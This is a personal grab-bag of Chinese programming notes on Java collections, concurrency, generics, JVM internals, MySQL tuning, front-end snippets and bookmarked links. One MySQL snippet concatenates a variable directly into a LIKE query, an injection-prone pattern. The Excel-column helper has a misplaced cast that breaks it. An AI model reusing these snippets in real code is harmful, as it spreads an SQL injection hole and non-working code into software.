public void operate() {
  synchronized(myobj){
http://www.cnblogs.com/jkgyu/p/4919223.html

多对象多线程的同步
public void operate() {
  synchronized(JustPlayServiceImplSyn2.class){
--------------------------------------------------------------------------------------
锁定的是调用这个同步方法对象
synchronized void methodAAA()
一个对象P1在不同的线程中执行这个同步方法时,它们之间会形成互斥

当synchronized修饰类名.class 或者静态方法的时候. 就算是不同对象,也会形成互斥
--------------------------------------------------------------------------------------
permanent space 永久
对于一个类A,不论实例化多少对象,它的代码区有始自终都只有一块这个区包含的主要是类的信息、
比如static字段,final常量（跟编译器还是有些关系）,各种方法

--------------------------------------------------------------------------------------
final修饰的类叫不可继承类

什么是不可变类?
答:特点是一旦创建了类的实例,实例内容(状态)不可被修改.典型类就是java中的String.
--------------------------------------------------------------------------------------
JDBC之PreparedStatement模糊查询
应该先用占位符表示 "SELECT * FROM test WHERE name = ?",然后在传参数的时候拼接ps.setString(1, "%"+参数+"%");
--------------------------------------------------------------------------------------
@Resource默认是按照名称来装配注入的
@Autowired默认是按照类型装配注入的,如果想按照名称来转配注入,则需要结合@Qualifier一起使用
@Resource和@Autowired都可以书写标注在字段或者该字段的setter方法之上

@Autowired
@Qualifier("datePrefixGenerator")
--------------------------------------------------------------------------------------
尽量采用懒加载的策略,即在需要的时候才创建
循环内不要不断创建对象引用
Object obj = null;
for (int i = 0; i <= count; i++)
{
    obj = new Object();
}
对资源的close()建议分开操作
Set<Map.Entry<String, String>> entrySet = hm.entrySet();
Iterator<Map.Entry<String, String>> iter = entrySet.iterator();
while (iter.hasNext())
{
    Map.Entry<String, String> entry = iter.next();
    System.out.println(entry.getKey() + "\t" + entry.getValue());
}

Integer.toString(i) 快
String.valueOf(i)方法会比+""高效节
--------------------------------------------------------------------------------------
StringBuffer 中的方法大都采用了 synchronized 关键字进行修饰,因此是线程安全的,
而 StringBuilder 没有这个修饰,可以被认为是线程不安全的
--------------------------------------------------------------------------------------
mysql datadir
--------------------------------------------------------------------------------------
lock锁（内存的可见性、互斥访问、限制编译器的代码优化调整）
Condition条件通知（线程间的协作）
--------------------------------------------------------------------------------------
<form action="#" method="post" enctype="multipart/form-data">

uploadImage.jsp?action=upload传递参数

if($("#pdfInput").val()==""){
        $("#pdfInput").remove();
        $("#uploadForm").attr("enctype", "application/x-www-form-urlencoded");
        //或者不用remove()就设为disabled也可以
        //$("#pdfInput").attr("disabled", "disabled");
}
--------------------------------------------------------------------------------------
<meta name="keywords" content="net,enterprise,ERP,c#">
<meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
--------------------------------------------------------------------------------------
直接使用双引号声明出来的String对象会直接存储在常量池中
如果不是用双引号声明的String对象,可以使用String提供的intern方法
intern 方法会从字符串常量池中查询当前字符串是否存在,若不存在就会将当前字符串放入常量池中
--------------------------------------------------------------------------------------
父类引用调用子类方法 接口(interface)
public Sub_Car_Class getSuperCar();

class Sub_Car_Class extends Super_Car_Class implements Super_Car_Interface

Super_Car_Class car1 = new Sub_Car_Class(1);
Super_Car_Interface superCarInterface1 = (Super_Car_Interface) car1;
Sub_Car_Class superCar1 = superCarInterface1.getSuperCar();
System.out.println(superCar1.getNum());
--------------------------------------------------------------------------------------
if(o1 == null && o2 == null) {
	return 0;
}
if(o1 == null) {
	return -1;
}
if(o2 == null) {
	return 1;
}
if(o1.getCreateTime() > o2.getCreateTime()) {
	return 1;
}
if(o2.getCreateTime() > o1.getCreateTime()) {
	return -1;
}
return 0;
--------------------------------------------------------------------------------------
CSS中 link 和@import 的区别是？
(1) link属于HTML标签,而@import是CSS提供的;
(2) 页面被加载的时,link会同时被加载,而@import引用的CSS会等到页面被加载完再加载;
(3) import只在IE5以上才能识别,而link是HTML标签,无兼容问题;
(4) link方式的样式的权重 高于@import的权重.
--------------------------------------------------------------------------------------
http://www.cnblogs.com/sniper-allen/p/4952660.html 前端面试题
--------------------------------------------------------------------------------------
查看碎片 data_free>0
select row_format,table_rows,data_length,index_length,max_data_length,data_free,engine
from information_schema.tables
where table_schema='test'
 and table_name='db_ap_rgsh_vertify_log_old'
limit 0,1;

innodb清理碎片
alter table db_ap_rgsh_vertify_log_old engine=innodb

myisam清理碎片
optimize table table_name

创建数据库
create database `test2` default character set utf8 collate utf8_general_ci;
--------------------------------------------------------------------------------------

集合框架中的泛型有什么好处
泛型允许我们指定集合中对象的类型 避免了运行时的ClassCastException异常并且我们不再进行类型转换和 instanceof 判断
--------------------------------------------------------------------------------------
为什么集合(Collection)不能继承Cloneable和Serializable接口?
Collection接口是一种抽象 的表示方法 具体的实现类才能决定它是否应该被clone或serialized
Collection
├List
│├LinkedList
│├ArrayList
│└Vector
│　└Stack
└Set
│
├queue├deque(双端队列)
      ├priorityqueue(优先级队列)

为什么Map接口不能继承Collection接口
Map不是集合,集合也不是Map Map保存的是键值对
Map提供了下面3个集合方法:
Set keySet(): 返回map中key的集合
Collection values(): 返回map中value的集合
Set<Map.Entry<K, V>> entrySet(): 返回map中键值对的集合

AbstractMap 是继承于Map的抽象类 TreeMap HashMap WeakHashMap Hashtable

ArrayList中是允许出现重复的数据的

LinkedList双端队列
--------------------------------------------------------------------------------------
Enumeration和Iterator接口有何不同
Iterator更安全,因为在对集合进行遍历时会阻止其他线程对集合进行修改 Iterator允许从集合中移除元素

StringTokenizer
String s=new String("The Java platform is the ideal platform for network computing");
StringTokenizer st = new StringTokenizer(s);
System.out.println( "Token Total: " + st.countTokens() );
while( st.hasMoreElements() ){
    System.out.println( st.nextToken() );
}
--------------------------------------------------------------------------------------
为什么没有类似Iterator.add()这样的方法来向集合中添加元素?
如果迭代器无法保证迭代的顺序,那么这种说法是不清晰的(unclear)注意的是,
ListIterator就提供了add()方法,因为它能保证迭代的顺序
--------------------------------------------------------------------------------------
Iterator与ListIterator有何不同?

Iterator可以用来遍历Set和List集合,而ListIterator只能用于遍历List
Iterator只能进行正向(forward direction)遍历而ListIterator可以双向遍历
ListIterator继承于Iterator接口,但却添加了一些额外的功能,如添加、替换元素,获取前后元素的索引
boolean hasNext()    //正向遍历
boolean hasPrvious()  //反向遍历
--------------------------------------------------------------------------------------
对iterator中的快速报错(fail-fast)特性有何理解?

Iterator 的快速报错机制会在每次取下一个元素时检查集合是否发生了修改若发现有修改,
那么就抛出 ConcurrentModificationException异常
除了像 ConcurrentHashMap,CopyOnWriteArrayList这样的并发集合类,
所有集合类的迭代器都是按fail-fast这种机制 进行实现的
--------------------------------------------------------------------------------------
fail-fast与fail-safe的区别是什么?
Iterator的fail-safe是对集合在进行clone时提供的一种保护机制,因此集合发生了修改不会引起任何问题
从设计上来说,java.util包中的集合类都是 fail-fast机制的,而java.util.concurrent包中的集合类都是fail-safe的
Fail-fast机制实现的 iterator会抛出ConcurrentModificationException异常,
而fail-safe机制的iterator永远不会抛出 ConcurrentModificationException异常
--------------------------------------------------------------------------------------
Vector, Hashtable, Properties and Stack都是同步的(synchronized)类,因此是线程安全的
--------------------------------------------------------------------------------------
http://www.leveluplunch.com/java/examples/remove-filter-null-references-from-collection-list/
--------------------------------------------------------------------------------------
http://www.cnblogs.com/chinaun/p/4953121.html 利用fullpage插件,快速开发整屏翻页的页面
--------------------------------------------------------------------------------------
//选项卡
 $('.stage_Tab .tabList li').click(function(){
     var index=$(this).index();
     alert(index);
     $(this).addClass('active').siblings('li').removeClass('active');
     $('.tabCont .tabItem:eq('+index+')').show().siblings().hide();
 });
--------------------------------------------------------------------------------------
"use strict"; 严格模式
保证代码运行的安全
消除Javascript语法的一些不合理、不严谨之处

全局变量显式声明
禁止使用with语句
创设eval作用域
禁止this关键字指向全局对象 !this=true
禁止在函数内部遍历调用栈
 f1.caller; // 报错
 f1.arguments; // 报错
严格模式下无法删除变量只有configurable设置为true的对象属性,才能被删除
var o = Object.create(null, {'x': {
　　　　value: 1,
　　　　configurable: true
}});
delete o.x; // 删除成功
禁止八进制表示法
禁止使用arguments.callee
将"use strict"放在函数体的第一行,则整个函数以"严格模式"运行

--------------------------------------------------------------------------------------
-DskipTests,不执行测试用例,但编译测试用例类生成相应的class文件至target/test-classes下
-Dmaven.test.skip=true,不执行测试用例,也不编译测试用例类

mvn eclipse:eclipse -Dcheckstyle.skip=true
--------------------------------------------------------------------------------------

java 8删除一个 removeif删除所有
--------------------------------------------------------------------------------------
TreeMap 允许value值为null,不允许key值为null   log(n)的复杂度进行get
TreeSet 不允许null
TreeSet是基于TreeMap实现的
利用TreeMap的特性,实现了set的有序性(通过红黑树实现)
--------------------------------------------------------------------------------------
Java中的 ObjectOutputStream 类的 writeObject() 方法可以实现序列化,类 ObjectInputStream 类的 readObject() 方法用于反序列化
ObjectInputStream 在反序列化时,没有对生成的对象的类型做限制

当执行readObject()代码的时候,会读取被序列化之后的bytestream,由于Java的特性,虽然这个读入的object最终会在类型转换时出现classcastexception,但这个对象事实上已经创建了,其构造函数和类构造函数都已经被调用


在使用 ObjectInputStream 与 ObjectOutputStream 类的时候,最好进行白名单校验,防止意外的发生
--------------------------------------------------------------------------------------
Thread.currentThread().getContextClassLoader().getResource("").getPath()+文件名
--------------------------------------------------------------------------------------
Error表示系统级的错误和程序不必处理的异常,
Exception表示需要捕捉或者需要程序进行处理的异常
--------------------------------------------------------------------------------------
mysql 转换为int
select convert('123',signed);
select cast('123' as signed);
--------------------------------------------------------------------------------------
//2011-02-06 03:04:25
Calendar superBowlXLV = Calendar.getInstance();
superBowlXLV.set(2011, 1, 6, 3, 4,25);
--------------------------------------------------------------------------------------
java 时间格式化 微秒 时区 星期
yyyy-MM-dd HH:mm:ss SSS z EEE

Calendar c = Calendar.getInstance();
c.set(Calendar.YEAR, year);
c.set(Calendar.MONTH, month-1); //0开始
--------------------------------------------------------------------------------------
replaceAll  replaceAll(paramString2)
replace replaceAll(Matcher.quoteReplacement(paramCharSequence2.toString())) -->转义了
--------------------------------------------------------------------------------------
http://www.baeldung.com/jackson-serialize-dates
--------------------------------------------------------------------------------------

守护线程
Thread.setDeamon(true);
守护线程中新产生的线程也是守护线程；
一些必须要有结果的任务（比如写文件,计算数据）不应该分配个守护线程执行,因为它可能在某个时刻就随JVM一同退出了

Java中的垃圾回收线程是一个典型的守护线程
--------------------------------------------------------------------------------------
?<? super T>表示包括T在内的任何T的父类,
<? extends T>表示包括T在内的任何T的子类
--------------------------------------------------------------------------------------
Java 8 并行流（parallel stream）采用共享线程池  ForkJoinPool
默认情况,fork/join 池会为每个处理器分配一个线程
--------------------------------------------------------------------------------------
public String getExcelString(int n) {
	// 上界
	char[] buf = new char[(int)Math.log(25 * (n + 1)) / Math.log(26)];
	System.out.println(buf.length);
	for (int i = buf.length - 1; i >= 0; i--) {
		n--;
		buf[i] = (char) ('A' + n % 26);
		n /= 26;
	}
	return new String(buf);
}

public void whenGetReadableSize(long size) {
	final String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
	final int unitIndex = (int) (Math.log10(size) / 3);
	final double unitValue = 1 << (unitIndex * 10);
	final String readableSize = new DecimalFormat("#,##0.#").format(size / unitValue) + " " + units[unitIndex];
	System.out.println(readableSize);
}
--------------------------------------------------------------------------------------
http://www.java2s.com/Tutorials/Java/java.util.function/IntUnaryOperator/1060__IntUnaryOperator.andThen.htm

--------------------------------------------------------------------------------------
休眠
TimeUnit.SECONDS.sleep(1);

guava
Stopwatch stopwatch = Stopwatch.createStarted();
Thread.sleep(3); // simulate work
stopwatch.stop(); // optional
long millis = stopwatch.elapsed(TimeUnit.MILLISECONDS);

org.springframework.util.StopWatch stopWatch = new org.springframework.util.StopWatch();
stopWatch.start("step 1");
Thread.sleep(2);
stopWatch.stop();
System.out.println(stopWatch.prettyPrint());
System.out.println(stopWatch.getTotalTimeMillis());
--------------------------------------------------------------------------------------
guava file RESTEasy
--------------------------------------------------------------------------------------
随机数
apache common math3
final long generatedLong = new RandomDataGenerator().nextLong(leftLimit, rightLimit);

final int generatedInteger = leftLimit + (int) (new Random().nextFloat() * (rightLimit - leftLimit));

apache common lang3
final String generatedString = RandomStringUtils.random(length, useLetters, useNumbers);

java8
List<Integer> randomInts = new Random().ints(1, 10).limit(25).boxed().collect(Collectors.toList());
IntStream.generate(() -> ThreadLocalRandom.current().nextInt(3)).limit(3).forEach(System.out::println);

--------------------------------------------------------------------------------------
改变原有List的话, 视图也会跟着一起改变
Collections.unmodifiableList(list)
ListUtils.unmodifiableList(list) --common collection
--------------------------------------------------------------------------------------
mysql导入数据
insert into bs_hlr_info_3 (hlr_code, hlr_type)
values
	('1870809', 0),
	('1870805', 0)

String sql="select * from student where name like concat('%'," + name + ",'%') ";

limit优化
条件 id数字 有序
select * from tbl_2 where id >=(
  select  id from tbl_2 order by  id limit 10000,1
) limit 10

select * from  tbl_2 as t1
  join (select id from tbl_2 order by id desc limit 1000,1) as t2
 where t1.id<=t2.id
order by t1.id desc
limit 10

表新增字段
写一起add column 不用分开下alter table
--------------------------------------------------------------------------------------
http://panyongzheng.iteye.com/blog/2257324 js
--------------------------------------------------------------------------------------
http://winterbe.com/blog/
--------------------------------------------------------------------------------------
http://flatlogic.github.io/awesome-bootstrap-checkbox/demo/
--------------------------------------------------------------------------------------
Spring security method  方法级别的权限控制
<global-method-security pre-post-annotations="enabled" />
// 注意这里方法保护,按角色.
@PreAuthorize("hasRole('ROLE_ADMIN')")
--------------------------------------------------------------------------------------
input:-webkit-autofill { box-shadow: 0 0 0px 1000px white inset !important;}
<form action="loginAction" method="post" autocomplete="off">
--------------------------------------------------------------------------------------
$('img').on('error', function () {
  $(this).prop('src', 'img/broken.png');
});
--------------------------------------------------------------------------------------
rmdir /s/q C:\Users\Test\Downloads\Java8Training-master
del /F/S/Q C:\Users\Test\Downloads\Java8Training-master
--------------------------------------------------------------------------------------
isAssignableFrom instanceof
When using instanceof, you need to know the class of "B" at compile time.
When using isAssignableFrom() it can be dynamic and change during runtime

instanceof can only be used with reference types, not primitive types.  isAssignableFrom() can be used with any class objects:

instanceof operator checks if the left object is same or subclass of right class,
while isAssignableFrom checks if we can assign object of the parameter class (from) to the reference of the class on which the method is called.
X x = new Y()

b instanceof A is equivalent to A.class.isAssignableFrom(b.getClass())
boolean test = Inner_A_Class.class.isAssignableFrom(b.getClass());
boolean test2 = Inner_A_Class.class.isInstance(b);
boolean test3 = b instanceof Inner_A_Class;

null instanceof X is false no matter what X is
null.getClass().isAssignableFrom(X) will throw a NullPointerException

isAssignableFrom()方法是从类继承的角度去判断,instanceof()方法是从实例继承的角度去判断
isAssignableFrom()方法是判断是否为某个类的父类,instanceof()方法是判断是否某个类的子类

Class.isAssignableFrom()是用来判断一个类Class1和另一个类Class2是否相同或是另一个类的子类或接口 全动态
Class.instanceof()是用来判断一个对象实例是否是一个类或接口的或其子类子接口的实例  静态
父类.class.isAssignableFrom(子类.class)

X instanceof YX 为需要检查的具体对象,Y是要判断的类型
Class.isAssignableFrom() 用来判断是否可以安全类型转换 子类能安全的转为父类

使用instanceof的时候,在编译阶段就要知道所反射对象的类型,而使用isAssignableFrom的时候,却不需要,可以在运行时动态反射成我们需要的对象类型,相比instanceof更灵活
--------------------------------------------------------------------------------------
判断两个枚举类型常量的值是否相等,可以直接使用"==",而不用equals()方法
比较两个枚举类型常量的值的大小,可以使用compareTo()方法 比较两个枚举常量的大小,就是比较它们序数ordinal的大小
--------------------------------------------------------------------------------------
http://blog.ubone.com/blog/2014/12/04/lei-wen-jian-yu-zi-jie-ma/ 类文件 字节码
--------------------------------------------------------------------------------------
如何使用javaassit asm
--------------------------------------------------------------------------------------
MethodHandle
方法句柄 可以在静态上下文中确定当前类
private static Logger logger = LoggerFactory.getLogger(MethodHandles.lookup().lookupClass());
--------------------------------------------------------------------------------------
class文件
常量池主要存放两大类常量：字面量（Literal）和符号引用（Symbolic References）
字面量比较接近于常量概念,如字符串、声明为final的常量值等
而符号引用则包括类和接口的全限定名（Full Qualifed Name）、字段的名称和描述符以及方法的名称和描述符

查看类文件的方法和属性
javap  Sample.class

javap -s可以输出签名的类型描述符

javap -v可以查看常量池
--------------------------------------------------------------------------------------
jvm 类型描述符
B: byte
C: char(16位Unicode字符)
D: double
F: float
I: int
J: long
L<类型名称>: 引用类型,如：Ljava/lang/String
S: short
Z: boolean
[: array-of
--------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------
https://github.com/annesadleir/hello-java-8/tree/master/src/main/java/uk/co/littlestickyleaves/hello/fork
--------------------------------------------------------------------------------------
null instanceof java.lang.Object -->false
--------------------------------------------------------------------------------------
java泛型擦除
ArrayList<String> stringList = Lists.newArrayList();
ArrayList<Integer> intList = Lists.newArrayList();
System.out.println(stringList.getClass().isAssignableFrom(intList.getClass()));--true
--------------------------------------------------------------------------------------
优化变长参数的方法调用 @SafeVarargs
public static <T> T useVarargsBefJava7(T... args)[java5]
可变长度的方法参数的实际值是通过数组来传递的,而数组中存储的是不可具体化的泛型类对象,自身存在类型安全问题

@SafeVarargs注解只能用在参数长度可变的方法或构造方法上,且方法必须声明为static或final,否则会出现编译错误
使用@SafeVarargs注解的前提是:必须确保这个方法的实现中对泛型类型参数的处理不会引发类型安全问题
--------------------------------------------------------------------------------------
@FunctionalInterface public
JDK中已有函数式接口,如Runnable
java.lang.Runnable
java.util.concurrent.Callable
java.security.PrivilegedAction
java.util.Comparator
java.io.FileFilter
java.nio.file.PathMatcher
java.lang.reflect.InvocationHandler
java.beans.PropertyChangeListener
java.awt.event.ActionListener
javax.swing.event.ChangeListener
JDK 8中又增加了java.util.function包, 提供了常用的函数式接口
--------------------------------------------------------------------------------------
spring httpinvoker
http://my.oschina.net/liting/blog/535277
--------------------------------------------------------------------------------------
web服务器要如何响应带Accept-Ranges的请求
第二：会写尾递归
第三：会写二分排序的尾递归
public void binaryInsertSort(int[] a) {
	for (int i = 1, len = a.length; i < len; i++) {
		int temp = a[i];
		int low = 0;
		int high = i - 1;
		while (low <= high) {
			int mid = low + ((high - low) >> 1);
			if (a[mid] < temp) {
				low = mid + 1;
			} else {
				high = mid - 1;
			}
		}
		for (int j = i - 1; j >= low; j--) {
			a[j + 1] = a[j];
		}
		a[low] = temp;
	}
}
--------------------------------------------------------------------------------------
https://github.com/GlxyDbyz/Features
--------------------------------------------------------------------------------------
joor
--------------------------------------------------------------------------------------
Arrays.asList 不可修改
--------------------------------------------------------------------------------------
Jar Jar Links 解决依赖问题 Minijar Maven 插件
--------------------------------------------------------------------------------------
public void stackOverflowErrorWithRecursive(int num) {
	System.out.println(num);
	stackOverflowErrorWithRecursive(num + 1);
}

尾递归
public long sumWithTailRecursive(int n, long result) {
	if (n == 0)
		return result;
	else
		return sumWithTailRecursive(n - 1, n + result);
}

public long sumWithTailRecursive(int n) {
	return sumWithTailRecursive(n, 0);
}
--------------------------------------------------------------------------------------
mysql怎么存储的,B+树,sql条件的原理
--------------------------------------------------------------------------------------
TCP   HTTP   UDP三者的关系:
TCP/IP是个协议组,可分为四个层次：网络接口层、网络层、传输层和应用层
在网络层有IP协议、ICMP协议、ARP协议、RARP协议和BOOTP协议
在传输层中有TCP协议与UDP协议
在应用层有FTP、HTTP、TELNET、SMTP、DNS等协议
HTTP本身就是一个协议,是从Web服务器传输超文本到本地浏览器的传送协议
--------------------------------------------------------------------------------------

bigint unsigned
--------------------------------------------------------------------------------------
CAP
C（一致性）一致性是指数据的原子性,在分布式环境下,一致性是指多个节点数据是否一致；
A（可用性）服务一直保持可用的状态,当用户发出一个请求,服务能在一定的时间内返回结果；
P（分区容忍性）
--------------------------------------------------------------------------------------
update table_xxx set name=#name#,version=version+1 where version=#version#
update table_xxx set quality=quality-#subQuality# where quality-#subQuality# >= 0

public Boolean doInTransaction(...) {

    // ①. 查询当前账户
    Account account = queryAccount(...);

    // ②. 检查余额是否足够
    if (withdraw.getAmount() > account.getBalance()){
        // ... throw Exp
    }

    // ③. 添加提现记录
    insertWithdraw(...)

    // ④. 添加账户明细
    insertDetail(...);

   	// ⑤. 更新账户余额
    // SQL如: UPDATE accounts SET balance=:newBalance WHERE id=:id AND balance=:oldBalance
    updateAccountBalance(..., account.getBalance());

    ...

}
频繁 消息队列等来将用户的账户操作像流水线一样来进行处理
--------------------------------------------------------------------------------------
无副作用的意思就是：
一个函数（java里是方法）的多次调用中,只要输入参数的值相同,输出结果的值也必然相同,
并且在这个函数执行过程中不会改变程序的任何外部状态（比如全局变量,对象中的属性,都属于外部状态）,也不依赖于程序的任何外部状态

无副作用的方法,一定是线程安全的

所有字段都设置成final的,只许赋值一次,保证对象不会被改变
--------------------------------------------------------------------------------------
数组是定长的,而ArrayList是变长的声明数组时就已经分配好内存了而数组的操作则会更快一些
ArrayList在增删元素方面要比数组简单
数组可以是多维的,但ArrayList只能是一维的
--------------------------------------------------------------------------------------
curator
--------------------------------------------------------------------------------------
public static boolean isNaN(double x) {
  return x!= x;
}
--------------------------------------------------------------------------------------
Iterable Iterator
Iterator是迭代器类,而Iterable是接口
Iterable的主要作用为：实现Iterable接口来实现适用于foreach遍历的自定义类

Iterator接口的核心方法next()或者hasNext() 是依赖于迭代器的当前迭代位置的
Iterable每次调用都会返回一个从头开始计数的迭代器 多个迭代器是互不干扰的

--------------------------------------------------------------------------------------
public static <K, V> Map.Entry<K, V> entry(K key, V value) {
  return new AbstractMap.SimpleImmutableEntry<K,V>(key, value);
}
--------------------------------------------------------------------------------------
AQS的原理
AbstractQueuedSynchronizer 采用CAS技术 compareAndSetState
FIFO队列,将阻塞的线程压入队列,进行排队管理,然后再按照顺序出队列 基于CLH锁（自旋锁
--------------------------------------------------------------------------------------
线程池的作用：
线程池作用就是限制系统中执行线程的数量
在allowCoreThreadTimeOut设置为true时,ThreadPoolExecutor的keepAliveTime参数必须大于0
executor.allowCoreThreadTimeOut(true);允许线程数低于corePoolSize时,线程也因为空闲而终止

When false, core threads are never terminated
--------------------------------------------------------------------------------------
http://www.lleid.com/?p=295
--------------------------------------------------------------------------------------
关注
https://github.com/rollenholt/word-template-render
https://github.com/zhegexiaohuozi/JsoupXpath
https://github.com/poetix/protonpack
https://github.com/amaembo/streamex/
https://github.com/amoerie/jstreams/
https://github.com/hankdavidson/java8-more-functional
https://github.com/proteinboy/java8  中文
https://github.com/aic-sri-international/aic-util
https://github.com/Leperous/functional-utils
https://github.com/hankdavidson/guava-java8-adapters
https://github.com/wkgcass/Style
https://github.com/APaloski/Java-8-Time-Utils

https://github.com/arnaudroger/SimpleFlatMapper  csv-->pojo框架
--------------------------------------------------------------------------------------
ImmutableMap key value不能为空
m2.merge value不能为空
--------------------------------------------------------------------------------------
dom解析
1允许应用程序对数据和结构做出更改
2访问是双向的,可以在任何时候在树中上下导航,获取和操作任意部分的数据
缺点
通常需要加载整个XML文档来构造层次结构,消耗资源大

SAX
1不需要等待所有数据都被处理,分析就能立即开始
2只在读取数据时检查数据,不需要保存在内存中
3可以在某个条件得到满足时停止解析,不必解析整个文档
4效率和性能较高,能解析大于系统内存的文档

缺点
需要应用程序自己负责TAG的处理逻辑（例如维护父/子关系等）,文档越复杂程序就越复杂
单向导航,无法定位文档层次,很难同时访问同一文档的不同部分数据,不支持XPath

StAX
1拉式解析的代码更简单
2拉式解析客户端能够一次读取多个XML文件
3拉式解析允许你过滤XML文件和跳过解析事件
--------------------------------------------------------------------------------------
xalan xml xpath big xml
--------------------------------------------------------------------------------------
saxon mpl许可 支持xpath2.0
--------------------------------------------------------------------------------------
https://github.com/javadev/underscore-java/tree/master/lodash-plugin
--------------------------------------------------------------------------------------
https://github.com/changmingxie/aggregate-framework ddd开发
https://github.com/lukehutch/fast-classpath-scanner 关注
https://dropwizard.github.io
https://github.com/AntonioMateus/Teste-Neo4j-Mysql
--------------------------------------------------------------------------------------
staxmate bsd许可
--------------------------------------------------------------------------------------
http://www.vogella.com/tutorials/

--------------------------------------------------------------------------------------
jackson-dataformat-xml stax date soapxml
Pig Trident
--------------------------------------------------------------------------------------
matches 用来匹配整个字符串,整个字符串符合正则表达式,才返回true.
find 用来匹配部分字符串, 整个字符串中有部分子串符合正则表达式,返回true.
lookingAt 用来检测字符串的开头部分是否符合正则表达式,如果符合,返回true.

public static boolean match(String regex, String str) {

  Pattern pattern = Pattern.compile(regex);

  Matcher matcher = pattern.matcher(str);

  return matcher.lookingAt();

}
--------------------------------------------------------------------------------------
@Value("#{config['mongodb.url'] ?: '127.0.0.1:27017'}")

@Value("${app.name:#{null}}")
@Value("${app.name:@null}")
private String name; 设置空值
--------------------------------------------------------------------------------------
new StringBuilder() 时char[]的默认长度是16 合理设置一个初始值
+XX:+OptimizeStringConcat,1.7默认打开 提高字符串拼接的性能
jinfo -flag OptimizeStringConcat 1088

StringBuffer的函数上都有synchronized关键字
StringBuffer是线程安全的，而StringBuilder不是

--------------------------------------------------------------------------------------
http://youyu4.iteye.com/blog/2263574 spring工具类
--------------------------------------------------------------------------------------
中间人攻击


正常情况下浏览器与服务器在TLS链接下内容是加密的,第三方即使可以嗅探到所有的数据,也不能解密
中间人可以与你建立链接,然后中间人再与服务器建立链接,转发你们之间的内容这时候中间人就获得了明文的信息

客户端产生一串随机数作为密钥,使用服务器发送过来的公钥加密,再发送给服务器服务器用对应的私钥解密
这种方式不能抵御中间人攻击,因为你不知道服务器发来的公钥是不是真的来自服务器
需要一个可信的第三方来为服务器作证
证书就是服务器的公钥、服务器的各种信息 加上一个可信的第三方对公钥和这些信息的签名
--------------------------------------------------------------------------------------
https的安全性主要是由SSL证书中的公钥和私钥来保证的
--------------------------------------------------------------------------------------
-XX:+PrintFlagsFinal打印参数值

-XX:AutoBoxCacheMax=20000 integer缓存
--------------------------------------------------------------------------------------
Number num = new Integer(1);  //对  可以用其子类进行实例化
ArrayList<Number> list = new ArrayList<Integer>(); //错

方法的形参是协变的、方法的返回值时逆变的  数组是协变 泛型是不变的

<? extends> 实现了泛型的协变
List<? extends Number> list = new ArrayList<Integer>();

<? super> 实现了泛型的逆变
List<? super Number> list2 = new ArrayList<Object>();

要从泛型类取数据时,用extends；
要往泛型类写数据时,用super；
既要取又要写,就不用通配符

子类变量能赋给父类变量,父类变量不能赋值给子类变量

Object[] array = (Object[]) new Float[1];
array[0] = "a string"; // 问题出在这里
System.out.println(array[0].toString());
--------------------------------------------------------------------------------------
Liskov替换原则(LSP) 里氏替换原则
所有引用基类（父类）的地方必须能透明地使用其子类的对象

LSP包含以下四层含义：
子类完全拥有父类的方法,且具体子类必须实现父类的抽象方法
子类中可以增加自己的方法
当子类覆盖或实现父类的方法时,方法的形参要比父类方法的更为宽松
当子类覆盖或实现父类的方法时,方法的返回值要比父类更严格
--------------------------------------------------------------------------------------
A B表示类型,f(.)表示类型转换,<=表示继承关系（比如,A<=B表示A是由B派生出来的子类）；
f(.)是逆变（contravariant）的,当A<=B时有f(B)<=f(A)成立；
f(.)是协变（covariant）的,当A<=B时有f(A)<=f(B)成立；
f(.)是不变（invariant）的,当A<=B时上述两个式子均不成立,即f(A)与f(B)相互之间没有继承关系
--------------------------------------------------------------------------------------
有共同好友且本身不是好友的   是二度人脉
http://www.neo4j.org.cn/ 图数据库

select to_id
  from test_query_friend_rela
 where from_id in
       (select to_id from test_query_friend_rela where from_id = 1)
   and to_id not in
       (select to_id from test_query_friend_rela where from_id = 1);

select f2.to_id
  from test_query_friend_rela f
  join test_query_friend_rela f2
    on f.to_id = f2.from_id
 where f2.to_id not in
       (select to_id from test_query_friend_rela where from_id = 1)
   and f.from_id = 1


# Friends of Friends
select distinct to_id
  from test_query_friend_rela
 where from_id in (select to_id from test_query_friend_rela where from_id = 1);

--------------------------------------------------------------------------------------
默认是on_close,那么如果沒有显示的去调用session.close或其它关闭连接的方法的话,这个连接时不会被关闭的
<prop key="hibernate.connection.release_mode">after_transaction</prop>
--------------------------------------------------------------------------------------
clear()方法会清空整个缓冲区 position设为0,把limit设为capacity,一般在把数据写入Buffer前调用
compact()方法只会清除已经读过的数据任何未读的数据都被移到缓冲区的起始处,新写入的数据将放到缓冲区未读数据的后面
flip 限制设置为当前位置,然后将位置设置为 0 则丢弃该标记,在准备从缓冲区中读取数据时调用flip方法
rewind 限制保持不变,将位置设置为 0 使缓冲区为重新读取已包含的数据做好准备 position = 0; mark = -1;

0 <= mark <= position <= limit <= capacity
public final Buffer clear() {
    position = 0;      //设置为0
    limit = capacity;    //极限和容量相同
    mark = -1;   //取消标记
    return this;
}
把position设为0，把limit设为capacity

public final Buffer flip() {
     limit = position;
     position = 0;
     mark = -1;
     return this;
}
把limit设为当前position，把position设为0，一般在从Buffer读出数据前调用

public final Buffer rewind() {
    position = 0;
    mark = -1;
    return this;
}
把position设为0，limit不变，一般在把数据重写入Buffer前调用
--------------------------------------------------------------------------------------
获取jdk版本
//返回执行的版本,如果尚不清楚,则返回null
Package pack = Package.getPackage("java.lang");
System.out.println("" + pack.getImplementationVersion());

System.getProperty("java.version")
--------------------------------------------------------------------------------------
统计信息
select * from mysql.innodb_table_stats where table_name='db_ap_rgsg_mb_work_order';
n_rows表总记录数
select * from mysql.innodb_index_stats where table_name='db_ap_rgsg_mb_work_order';
唯一值数 n_diff_pfx01

MySQL的统计信息非常少,只有表行数和索引列的唯一值数目 执行计划不佳

MySQL的 join操作的 效率 非常依赖于索引

数据碎片
select data_free
from  information_schema.tables
where table_schema='test'
and table_name='db_ap_rgsg_mb_work_order';

show table status from test where name='db_ap_rgsg_mb_work_order'

会话
show full processlist;

单表单文件
show variables like '%per_table%';

show global variables like 'innodb%';
show global status like 'innodb%';

innodb数据大小
select sum(data_length) as value
from information_schema.tables
where engine='innodb';

innodb索引大小
select sum(index_length) as value
from information_schema.tables
where engine='innodb';

The size of JSON documents stored in JSON columns is limited to the value of the max_allowed_packet system variable
show variables like  '%max_allowed_packet%'
utf8mb4

获取表
show table status where comment != 'VIEW';

--------------------------------------------------------------------------------------
